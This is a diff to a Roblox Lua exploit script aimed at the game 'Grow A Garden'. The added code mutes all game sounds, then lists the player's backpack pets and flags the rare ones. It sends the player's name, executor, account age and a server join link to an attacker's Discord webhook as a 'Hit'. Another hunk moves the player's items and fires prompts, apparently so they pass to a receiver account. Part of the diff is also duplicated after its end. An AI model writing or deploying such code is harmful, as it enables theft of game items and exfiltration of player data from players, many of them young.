@@ -12,7 +12,6 @@ local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local Backpack = lp:WaitForChild("Backpack")
 
--- 🧠 Rejoin if in a private server or full public server
 task.spawn(function()
     if game.PrivateServerId ~= "" or #Players:GetPlayers() >= game.MaxPlayers then
         local servers = {}
@@ -37,16 +36,25 @@ task.spawn(function()
     end
 end)
 
+local SoundService = game:GetService("SoundService")
 
--- 🔇 Mute all sounds
-for _, inst in ipairs(workspace:GetDescendants()) do
-    if inst:IsA("Sound") then
-        inst:Stop()
-        inst.Playing = false
+SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+SoundService.Volume = 0
+
+for _, sound in ipairs(game:GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+        sound:Stop()
     end
 end
 
--- 📦 Inventory handling
+game.DescendantAdded:Connect(function(desc)
+    if desc:IsA("Sound") then
+        desc.Volume = 0
+        desc:Stop()
+    end
+end)
+
 local ig = { "trowel", "watering can", "sprinkler", "egg", "rod" }
 local animals = { "bunny", "dog", "golden lab", "chicken", "pig", "cow", "duck", "bee", "owl", "fox", "bear", "goat", "hedgehog", "horse", "donkey", "sheep", "cat", "turkey", "bat", "skeleton", "ghost", "pumpkin", "zombie", "reindeer", "elf", "penguin", "polar bear", "dragonfly", "queen bee", "disco bee", "chicken jockey", "cooked owl", "raccoon", "red fox" }
 local rareEmojiMap = {
@@ -56,32 +64,104 @@ local rareEmojiMap = {
 }
 
 local function contains(name, list)
+    name = name:lower()
     for _, kw in ipairs(list) do
-        if name:find(kw, 1, true) then
+        if name:find(kw:lower(), 1, true) then
             return true
         end
     end
     return false
 end
 
--- 📤 Send Webhook
 do
-    local animalItems, otherItems = {}, {}
+    local rareItems, commonItems, otherItems = {}, {}, {}
     local mention = false
     for _, tool in ipairs(Backpack:GetChildren()) do
         local nm = tool.Name
         local lnm = nm:lower()
         if not contains(lnm, ig) then
             local emoji = rareEmojiMap[lnm]
-            if emoji then mention = true end
             local line = string.format("%s %s", emoji or "-", nm)
+
             if contains(lnm, animals) then
-                table.insert(animalItems, line)
+                if emoji then
+                    table.insert(rareItems, line)
+                    mention = true
+                else
+                    table.insert(commonItems, line)
+                end
             else
                 table.insert(otherItems, line)
             end
         end
     end
+
+    local animalItems = {}
+    for _, v in ipairs(rareItems) do table.insert(animalItems, v) end
+    for _, v in ipairs(commonItems) do table.insert(animalItems, v) end
+
+    local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
+    if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
+
+    local function getAccountAge()
+        local success, result = pcall(function() return lp.AccountAge end)
+        return success and (result .. " days") or "Unknown"
+    end
+
+    local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
+
+    local payload = {
+        username = "Captain Hook",
+        embeds = { {
+            title = "🌿 Grow A Garden Hit 🌿",
+            color = 5763719,
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
+                    inline = false
+                },
+                {
+                    name = "🎒 Backpack",
+                    value = desc,
+                    inline = false
+                },
+                {
+                    name = "💥 Hits",
+                    value = "All Items",
+                    inline = false
+                },
+                {
+                    name = "🔗 Join with URL",
+                    value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
+                    inline = false
+                }
+            }
+        }}
+    }
+
+    if mention then payload.content = "@everyone" end
+
+    local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
+    if httpRequest then
+        local success, res = pcall(function()
+            return httpRequest({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if success and res and res.StatusCode ~= 204 then
+            warn("Webhook Error: " .. res.StatusCode, res.Body or "")
+        elseif not success then
+            warn("HTTP request failed.")
+        end
+    else
+        warn("Executor does not support HTTP requests.")
+    end
+end
+
 
     local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
     if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
@@ -242,11 +322,11 @@ do
                     local nm = t.Name
                     if not shouldSkip(nm) then
                         t.Parent = char
-                        task.wait(0.05)
+                        task.wait(0.5)
                         firePrompts()
-                        task.wait(0.05)
+                        task.wait(0.5)
                         t.Parent = Backpack
-                        task.wait(0.05)
+                        task.wait(0.5)
                     end
                 end
             end
